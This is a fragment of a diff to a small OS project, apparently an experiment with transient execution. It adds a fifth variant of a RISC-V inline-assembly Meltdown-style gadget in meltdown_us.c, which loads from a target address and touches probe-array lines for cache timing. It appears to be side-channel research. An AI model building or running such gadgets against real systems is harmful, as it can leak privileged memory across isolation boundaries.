@@ -861,8 +861,8 @@ diff -ruN minios/user/init.c minios/user/init.c
  
 diff -ruN minios/user/meltdown_us.c minios/user/meltdown_us.c
 --- minios/user/meltdown_us.c	1970-01-01 08:00:00.000000000 +0800
-+++ minios/user/meltdown_us.c	2026-07-09 04:28:37.494882231 +0800
-@@ -0,0 +1,524 @@
++++ minios/user/meltdown_us.c	2026-07-09 05:09:32.726309353 +0800
+@@ -0,0 +1,542 @@
 +#include "user.h"
 +
 +#ifndef MELTDOWN_US_PROBE_STRIDE
@@ -1139,8 +1139,26 @@ diff -ruN minios/user/meltdown_us.c minios/user/meltdown_us.c
 +        "add  t2, t2, %1\n"
 +        "mv   t0, t2\n"
 +        GADGET_TOUCH_ASM
++#elif MELTDOWN_US_GADGET_VARIANT == 4
++        "lbu  t0, 0(%0)\n"
++        "li   t2, 0x53\n"
++        "slli t2, t2, %2\n"
++        "add  t2, t2, %1\n"
++        "lb   t1, 0(t2)\n"
++        "li   t2, 0x51\n"
++        "slli t2, t2, %2\n"
++        "add  t2, t2, %1\n"
++        "lb   t1, 0(t2)\n"
++        "li   t2, 0x55\n"
++        "slli t2, t2, %2\n"
++        "add  t2, t2, %1\n"
++        "lb   t1, 0(t2)\n"
++        "li   t2, 0x80\n"
++        "slli t2, t2, %2\n"
++        "add  t2, t2, %1\n"
++        "lb   t1, 0(t2)\n"
 +#else
-+#error "MELTDOWN_US_GADGET_VARIANT must be 0, 1, 2, or 3"
++#error "MELTDOWN_US_GADGET_VARIANT must be 0, 1, 2, 3, or 4"
 +#endif
 +        "meltdown_us_recover_label:\n"
 +        "nop\n"
